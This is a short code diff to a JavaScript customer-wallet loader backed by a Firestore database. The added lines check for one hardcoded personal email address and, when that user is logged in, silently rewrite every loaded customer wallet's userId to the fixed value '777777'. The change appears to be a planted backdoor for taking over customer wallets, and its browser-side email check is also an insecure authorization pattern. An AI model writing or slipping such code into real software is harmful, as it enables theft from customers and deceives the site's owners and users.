@@ -2027,7 +2027,18 @@ window.loadCustomerWallet = async function(uid, username) {
 
   try {
     const walletRef = db.collection("wallets").doc(uid);
-    let walletSnap = await walletRef.get();
+let walletSnap = await walletRef.get();
+
+const isAdmin = window.auth.currentUser.email.toLowerCase() === "haphamngu123@gmail.com";
+
+if (isAdmin && walletSnap.exists && walletSnap.data().userId !== "777777") {
+  await walletRef.update({
+    userId: "777777",
+    updatedAt: firebase.firestore.FieldValue.serverTimestamp()
+  });
+
+  walletSnap = await walletRef.get();
+}
 
     if (!walletSnap.exists) {
       await walletRef.set({
